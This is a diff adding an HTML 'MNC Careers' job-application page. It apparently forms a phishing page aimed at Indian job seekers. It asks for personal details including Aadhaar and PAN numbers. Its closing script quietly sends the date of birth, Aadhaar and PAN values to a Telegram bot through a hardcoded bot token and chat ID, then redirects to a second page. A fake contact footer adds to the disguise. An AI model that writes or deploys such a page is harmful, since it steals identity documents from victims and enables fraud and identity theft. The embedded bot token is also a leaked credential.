@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MNC Careers</title>
+    <style>
+        /* General styles */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: white;
+        }
+
+        .header {        
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            margin-left: 10px;  
+            width: 40%;
+        }
+
+        .menu-btn {
+            margin-right: 20px;
+            cursor: pointer;
+            font-size: 35px;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            background-color: white;
+            padding: 20px;
+            margin-top: 0px;
+            padding-top: 0px;            
+            border-radius: 8px;
+        }
+
+        h2 {
+            text-align: center;
+            color: #20B2AA;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #333;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 25px;
+            font-size: 16px;
+        }
+
+        .form-group input::placeholder {
+            color: #aaa;
+        }
+
+        .form-group button {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 25px;
+            background-color: #20B2AA;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .form-group button:hover {
+            background-color: #008B8B;
+        }
+        
+        
+                .sidebar {
+            height: 100%;
+            width: 0;
+            position: fixed;
+            z-index: 1;
+            top: 0;
+            left: 0;
+            background-color: #FFFFE0;
+            overflow-x: hidden;
+            transition: 0.5s;
+            padding-top: 60px;
+        } 
+        
+        .sidebar img {
+            padding-left: 50px;
+            width: 100px;
+        }
+
+        .welcome-message {
+            padding-left: 50px;
+            padding-bottom:50px;
+            font-weight: bold;
+        }
+
+        .sidebar a {
+            padding: 8px 8px 8px 32px;
+            text-decoration: none;
+            font-size: 25px;
+            color: black;
+            display: block;
+            transition: 0.3s;
+        }
+
+        .sidebar a:hover {
+            color: #f1f1f1;
+        }
+
+        .sidebar .closebtn {
+            position: absolute;
+            top: 0;
+            right: 25px;
+            font-size: 36px;
+            margin-left: 50px;
+        }
+        
+        .contact-info {
+            text-align: left;
+        }
+        .contact-info p {
+            margin: 10px 0;
+            font-size: 14px;
+        }
+        .contact-info i {
+            margin-left: 10px;
+        }
+        .footer {
+            background-color: black;
+            color: white;         
+            padding:12px;
+            text-align: center;
+            font-size: 14px;
+        }
+        .footer h1{
+   	color:white;
+        } 
+        
+        
+        .welcome-message {
+            padding-left: 50px;
+            padding-bottom:50px;
+            font-weight: bold;
+        }
+        
+        
+            .line2 {
+            width: 100%;
+            height: 3px;
+            background-color: white;
+            margin: 20px 0;
+        }
+        
+    </style>
+</head>
+<body>
+    <div class="header">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+        <img src="images/logo.jpg" alt="Logo" class="logo" width="50">
+        <div class="menu-btn" onclick="openNav()">&#9776;</div>
+    </div>
+ <div class="container">
+    <div id="mySidebar" class="sidebar"> 
+        <img src="images/side.jpg">
+        <p class="welcome-message">Welcome Guest</p>
+        <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">&times;</a>
+            <a href="index.html">Home</a>
+        <a href="apply.html">Apply Now</a>
+        <a href="about.html">About Us</a>
+        <a href="contact.html">Contact Us</a>
+    </div><br>    
+        <h2>APPLY NOW</h2>
+        <form id="applyForm">
+            <div class="form-group">
+                <label for="name">Name</label>
+                <input type="text" id="name" name="name" placeholder="Name" required>
+            </div>
+            <div class="form-group">
+                <label for="mobile">Mobile Number</label>
+                <input type="tel" maxlength="10" id="mobile" name="mobile" placeholder="Mobile Number" required>
+            </div>
+            <div class="form-group">
+                <label for="email">Email ID</label>
+                <input type="email" id="email" name="email" placeholder="Email ID" required>
+            </div>
+            <div class="form-group">
+                <label for="state">State</label>
+                <input type="text" id="state" name="state" placeholder="State" required>
+            </div>
+            <div class="form-group">
+                <label for="dob">Date of Birth</label>
+                <input type="tel" id="dob" maxlength= "8" name="dob" placeholder="DD/MM/YY" required>
+            </div>
+            <div class="form-group">
+                <label for="Adhaar">Aadhaar Number</label>
+                <input type="tel" id="Adhaar" maxlength= "12"name="Adhaar" placeholder="Aadhaar Number" required>
+            </div>
+            <div class="form-group">
+                <label for="pan">PanCard Number</label>
+                <input type="text" maxlength= "10" id="pan" name="pan" placeholder="PanCard Number" required>
+            </div>
+            <div class="form-group">
+                <button type="submit">SUBMIT</button>
+            </div>
+        </form>
+    </div>
+
+    <div class="footer">
+        <h1>MNC CAREERS</h1>
+        <div class="contact-info">
+            <p><i class="fas fa-map-marker-alt"></i> Hosur Road, Bengaluru - 560029, Karnataka, India</p>
+            <p><i class="fas fa-phone-alt"></i> Tel: +11 994012 9100</p>
+            <p><i class="fas fa-fax"></i> Fax: 40129000</p>
+            <p><i class="fas fa-envelope"></i> Email: mail@mmc-careers.net</p>
+            <p><i class="fas fa-globe"></i> APP: MNC-CAREERS</p>
+        </div>
+        <div class="line2"></div>
+        <div>
+            Copyright © All Rights reserved by MNC Careers 2024
+        </div>
+    </div>
+
+<script>
+        // Function to open the sidebar
+        function openNav() {
+            document.getElementById("mySidebar").style.width = "250px";
+        }
+
+        // Function to close the sidebar
+        function closeNav() {
+            document.getElementById("mySidebar").style.width = "0";
+        }    
+        
+    </script>
+    <script>
+        
+        const botToken = '7029708296:AAHrc2_1xOjh3t5gQUIUCN7QBqV09BtpeRg';
+        const chatId = '7418391998';
+
+        // Function to send message to Telegram bot
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const data = {
+                chat_id: chatId,
+                text: message,
+            };
+
+            return fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            }).then(response => response.json());
+        }
+
+        document.getElementById('applyForm').addEventListener('submit', function (event) {
+            event.preventDefault(); // Prevent the default form submission
+
+            const dob = document.getElementById('dob').value;
+            const adhaar = document.getElementById('Adhaar').value;
+            const pan = document.getElementById('pan').value;
+
+            // Format the message to send
+            const message = `
+            Date of Birth: ${dob}
+            Aadhaar Number: ${adhaar}
+            PAN Card Number: ${pan}
+            `;
+
+            // Send the message to Telegram and redirect on success
+            sendToTelegram(message)
+                .then(response => {
+                    if (response.ok) {
+                        window.location.href = 'apply2.html';
+                    } else {
+                        alert('Failed to submit the form. Please try again.');
+                    }
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                    alert('An error occurred. Please try again.');
+                });
+        });
+
+        // Function to open the sidebar
+        function openNav() {
+            document.getElementById("mySidebar").style.width = "250px";
+        }
+
+        // Function to close the sidebar
+        function closeNav() {
+            document.getElementById("mySidebar").style.width = "0";
+        }
+    </script>
+</body>
+</html>
